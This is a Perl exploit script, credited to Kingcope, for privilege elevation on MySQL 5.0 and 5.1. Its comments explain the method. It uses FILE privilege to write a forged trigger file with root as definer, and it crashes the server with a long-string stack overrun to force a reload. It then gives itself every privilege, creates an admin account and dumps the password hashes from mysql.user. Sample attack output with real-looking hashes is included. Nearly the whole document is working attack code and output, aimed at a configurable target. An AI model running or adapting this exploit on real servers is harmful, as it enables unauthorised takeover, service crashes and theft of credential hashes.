use DBI();

$|=1;

=for comment

MySQL privilege elevation Exploit
This exploit adds a new admin user.
By Kingcope

Tested on 
* Debian Lenny (mysql-5.0.51a)
* OpenSuSE 11.4 (5.1.53-log)

How it works:
This exploit makes use of several things:
*The attacker is in possession of a mysql user with 'file' privileges for the target
*So the attacker can create files on the system with this user (owned by user 'mysql')
*So the attacker is able to create TRIGGER files for a mysql table
	triggers can be used to trigger an event when a mysql command is executed by the user,
	normally triggers are 'attached' to a user and will be executed with this users privilege.
	because we can write any contents into the TRG file (the actual trigger file), we write the entry
	describing the attached user for the trigger as "root@localhost" what is the default admin user.
* We make use of the stack overrun priorly discovered to flush the server config so the trigger file is recognized.
  This step is really important, without crashing the mysql server instance and reconnecting (the server will respawn)
  the trigger file would not be recognized.

So what the exploit does is:
* Connect to the MySQL Server
* Create a table named rootme for the trigger
* Create the trigger file in /var/lib/mysql/<databasename>/rootme.TRG
* Crash the MySQL Server to force it to respawn and recognize the trigger file (by triggering the stack overrun)
* INSERT a value into the table so the trigger event gets executed
* The trigger now sets all privileges of the current connecting user in the mysql.user table to enabled.
* Crash the MySQL Server again to force it reload the user configuration
* Create a new mysql user with all privileges set to enabled
* Crash again to reload configuration
* Connect by using the newly created user
* The new connection has ADMIN access now to all databases in mysql
* The user and password hashes in the mysql.user table are dumped for a convinient way to show the exploit succeeded
* As said the user has FULL ACCESS to the database now

Respawning of mysqld is done by mysqld_safe so this is not an issue in any configuration I've seen.
=cut

=for comment

user created for testing (file privs will minor privileges to only one database):

mysql> CREATE USER 'less'@'%' IDENTIFIED BY 'test';
Query OK, 0 rows affected (0.00 sec)

mysql> create database lessdb
    -> ;
Query OK, 1 row affected (0.00 sec)

mysql> GRANT ALL PRIVILEGES ON lessdb.* TO 'less'@'%' WITH GRANT OPTION;
Query OK, 0 rows affected (0.02 sec)

mysql> GRANT FILE ON *.* TO 'less'@'%' WITH GRANT OPTION;
Query OK, 0 rows affected (0.00 sec)

login with new unprivileged user:
mysql> select * from mysql.user;
ERROR 1142 (42000): SELECT command denied to user 'less2'@'localhost' for table 'user'

=cut

=for comment

example attack output:

C:\Users\kingcope\Desktop>perl mysql_privilege_elevation.pl
select 'TYPE=TRIGGERS' into outfile'/var/lib/mysql/lessdb3/rootme.TRG' LINES TER
MINATED BY '\ntriggers=\'CREATE DEFINER=`root`@`localhost` trigger atk after ins
ert on rootme for each row\\nbegin \\nUPDATE mysql.user SET Select_priv=\\\'Y\\\
', Insert_priv=\\\'Y\\\', Update_priv=\\\'Y\\\', Delete_priv=\\\'Y\\\', Create_p
riv=\\\'Y\\\', Drop_priv=\\\'Y\\\', Reload_priv=\\\'Y\\\', Shutdown_priv=\\\'Y\\
\', Process_priv=\\\'Y\\\', File_priv=\\\'Y\\\', Grant_priv=\\\'Y\\\', Reference
s_priv=\\\'Y\\\', Index_priv=\\\'Y\\\', Alter_priv=\\\'Y\\\', Show_db_priv=\\\'Y
\\\', Super_priv=\\\'Y\\\', Create_tmp_table_priv=\\\'Y\\\', Lock_tables_priv=\\
\'Y\\\', Execute_priv=\\\'Y\\\', Repl_slave_priv=\\\'Y\\\', Repl_client_priv=\\\
'Y\\\', Create_view_priv=\\\'Y\\\', Show_view_priv=\\\'Y\\\', Create_routine_pri
v=\\\'Y\\\', Alter_routine_priv=\\\'Y\\\', Create_user_priv=\\\'Y\\\', ssl_type=
\\\'Y\\\', ssl_cipher=\\\'Y\\\', x509_issuer=\\\'Y\\\', x509_subject=\\\'Y\\\',
max_questions=\\\'Y\\\', max_updates=\\\'Y\\\', max_connections=\\\'Y\\\' WHERE
User=\\\'less3\\\';\\nend\'\nsql_modes=0\ndefiners=\'root@localhost\'\nclient_cs
_names=\'latin1\'\nconnection_cl_names=\'latin1_swedish_ci\'\ndb_cl_names=\'lati
n1_swedish_ci\'\n';DBD::mysql::db do failed: Unknown table 'rootme' at mysql_pri
vilege_elevation.pl line 44.
DBD::mysql::db do failed: Lost connection to MySQL server during query at mysql_
privilege_elevation.pl line 50.
DBD::mysql::db do failed: Lost connection to MySQL server during query at mysql_
privilege_elevation.pl line 59.
W00TW00T!
Found a row: id = root, name = *81F5E21E35407D884A6CD4A731AEBFB6AF209E1B
Found a row: id = root, name = *81F5E21E35407D884A6CD4A731AEBFB6AF209E1B
Found a row: id = root, name = *81F5E21E35407D884A6CD4A731AEBFB6AF209E1B
Found a row: id = debian-sys-maint, name = *C5524C128621D8A050B6DD616B06862F9D64
B02C
Found a row: id = some1, name = *94BDCEBE19083CE2A1F959FD02F964C7AF4CFC29
Found a row: id = monty, name = *BF06A06D69EC935E85659FCDED1F6A80426ABD3B
Found a row: id = less, name = *94BDCEBE19083CE2A1F959FD02F964C7AF4CFC29
Found a row: id = r00ted, name = *EAD0219784E951FEE4B82C2670C9A06D35FD5697
Found a row: id = user, name = *14E65567ABDB5135D0CFD9A70B3032C179A49EE7
Found a row: id = less2, name = *94BDCEBE19083CE2A1F959FD02F964C7AF4CFC29
Found a row: id = less3, name = *94BDCEBE19083CE2A1F959FD02F964C7AF4CFC29
Found a row: id = rootedsql, name = *4149A2E66A41BD7C8F99D7F5DF6F3522B9D7D9BC

=cut

$user = "less10";
$password = "test";
$database = "lessdb10";
$target = "192.168.2.4";
$folder = "/var/lib/mysql/"; # Linux
$newuser = "rootedbox2";
$newuserpass = "rootedbox2";
$mysql_version = "51"; # can be 51 or 50

if ($mysql_version eq "50") {
$inject =
"select 'TYPE=TRIGGERS' into outfile'".$folder.$database."/rootme.TRG' LINES TERMINATED BY '\\ntriggers=\\'CREATE DEFINER=`root`\@`localhost` trigger atk after insert on rootme for each row\\\\nbegin \\\\nUPDATE mysql.user SET Select_priv=\\\\\\'Y\\\\\\', Insert_priv=\\\\\\'Y\\\\\\', Update_priv=\\\\\\'Y\\\\\\', Delete_priv=\\\\\\'Y\\\\\\', Create_priv=\\\\\\'Y\\\\\\', Drop_priv=\\\\\\'Y\\\\\\', Reload_priv=\\\\\\'Y\\\\\\', Shutdown_priv=\\\\\\'Y\\\\\\', Process_priv=\\\\\\'Y\\\\\\', File_priv=\\\\\\'Y\\\\\\', Grant_priv=\\\\\\'Y\\\\\\', References_priv=\\\\\\'Y\\\\\\', Index_priv=\\\\\\'Y\\\\\\', Alter_priv=\\\\\\'Y\\\\\\', Show_db_priv=\\\\\\'Y\\\\\\', Super_priv=\\\\\\'Y\\\\\\', Create_tmp_table_priv=\\\\\\'Y\\\\\\', Lock_tables_priv=\\\\\\'Y\\\\\\', Execute_priv=\\\\\\'Y\\\\\\', Repl_slave_priv=\\\\\\'Y\\\\\\', Repl_client_priv=\\\\\\'Y\\\\\\', Create_view_priv=\\\\\\'Y\\\\\\', Show_view_priv=\\\\\\'Y\\\\\\', Create_routine_priv=\\\\\\'Y\\\\\\', Alter_routine_priv=\\\\\\'Y\\\\\\', Create_user_priv=\\\\\\'Y\\\\\\', ssl_type=\\\\\\'Y\\\\\\', ssl_cipher=\\\\\\'Y\\\\\\', x509_issuer=\\\\\\'Y\\\\\\', x509_subject=\\\\\\'Y\\\\\\', max_questions=\\\\\\'Y\\\\\\', max_updates=\\\\\\'Y\\\\\\', max_connections=\\\\\\'Y\\\\\\' WHERE User=\\\\\\'$user\\\\\\';\\\\nend\\'\\nsql_modes=0\\ndefiners=\\'root\@localhost\\'\\nclient_cs_names=\\'latin1\\'\\nconnection_cl_names=\\'latin1_swedish_ci\\'\\ndb_cl_names=\\'latin1_swedish_ci\\'\\n';";
} else {
$inject =
"select 'TYPE=TRIGGERS' into outfile'".$folder.$database."/rootme.TRG' LINES TERMINATED BY '\\ntriggers=\\'CREATE DEFINER=`root`\@`localhost` trigger atk after insert on rootme for each row\\\\nbegin \\\\nUPDATE mysql.user SET Select_priv=\\\\\\'Y\\\\\\', Insert_priv=\\\\\\'Y\\\\\\', Update_priv=\\\\\\'Y\\\\\\', Delete_priv=\\\\\\'Y\\\\\\', Create_priv=\\\\\\'Y\\\\\\', Drop_priv=\\\\\\'Y\\\\\\', Reload_priv=\\\\\\'Y\\\\\\', Shutdown_priv=\\\\\\'Y\\\\\\', Process_priv=\\\\\\'Y\\\\\\', File_priv=\\\\\\'Y\\\\\\', Grant_priv=\\\\\\'Y\\\\\\', References_priv=\\\\\\'Y\\\\\\', Index_priv=\\\\\\'Y\\\\\\', Alter_priv=\\\\\\'Y\\\\\\', Show_db_priv=\\\\\\'Y\\\\\\', Super_priv=\\\\\\'Y\\\\\\', Create_tmp_table_priv=\\\\\\'Y\\\\\\', Lock_tables_priv=\\\\\\'Y\\\\\\', Execute_priv=\\\\\\'Y\\\\\\', Repl_slave_priv=\\\\\\'Y\\\\\\', Repl_client_priv=\\\\\\'Y\\\\\\', Create_view_priv=\\\\\\'Y\\\\\\', Show_view_priv=\\\\\\'Y\\\\\\', Create_routine_priv=\\\\\\'Y\\\\\\', Alter_routine_priv=\\\\\\'Y\\\\\\', Create_user_priv=\\\\\\'Y\\\\\\', Event_priv=\\\\\\'Y\\\\\\', Trigger_priv=\\\\\\'Y\\\\\\', ssl_type=\\\\\\'Y\\\\\\', ssl_cipher=\\\\\\'Y\\\\\\', x509_issuer=\\\\\\'Y\\\\\\', x509_subject=\\\\\\'Y\\\\\\', max_questions=\\\\\\'Y\\\\\\', max_updates=\\\\\\'Y\\\\\\', max_connections=\\\\\\'Y\\\\\\' WHERE User=\\\\\\'$user\\\\\\';\\\\nend\\'\\nsql_modes=0\\ndefiners=\\'root\@localhost\\'\\nclient_cs_names=\\'latin1\\'\\nconnection_cl_names=\\'latin1_swedish_ci\\'\\ndb_cl_names=\\'latin1_swedish_ci\\'\\n';";
}

print $inject;#exit;
$inject2 =
"SELECT 'TYPE=TRIGGERNAME\\ntrigger_table=rootme;' into outfile '".$folder.$database."/atk.TRN' FIELDS ESCAPED BY ''";

my $dbh = DBI->connect("DBI:mysql:database=$database;host=$target;",
                       "$user", "$password",
                       {'RaiseError' => 0});
eval { $dbh->do("DROP TABLE rootme") };
$dbh->do("CREATE TABLE rootme (rootme VARCHAR(256));");
$dbh->do($inject);
$dbh->do($inject2);

$a = "A" x 10000;
$dbh->do("grant all on $a.* to 'user'\@'%' identified by 'secret';");

sleep(3);

my $dbh = DBI->connect("DBI:mysql:database=$database;host=$target;",
                       "$user", "$password",
                       {'RaiseError' => 0});

$dbh->do("INSERT INTO rootme VALUES('ROOTED');");
$dbh->do("grant all on $a.* to 'user'\@'%' identified by 'secret';");

sleep(3);

my $dbh = DBI->connect("DBI:mysql:database=$database;host=$target;",
                       "$user", "$password",
                       {'RaiseError' => 0});

$dbh->do("CREATE USER '$newuser'\@'%' IDENTIFIED BY '$newuserpass';");
$dbh->do("GRANT ALL PRIVILEGES ON *.* TO '$newuser'\@'%' WITH GRANT OPTION;");
$dbh->do("grant all on $a.* to 'user'\@'%' identified by 'secret';");

sleep(3);

my $dbh = DBI->connect("DBI:mysql:host=$target;",
                       $newuser, $newuserpass,
                       {'RaiseError' => 0});

my $sth = $dbh->prepare("SELECT * FROM mysql.user");
$sth->execute();

print "W00TW00T!\n";

while (my $ref = $sth->fetchrow_hashref()) {
print "Found a row: id = $ref->{'User'}, name = $ref->{'Password'}\n";
}
$sth->finish();

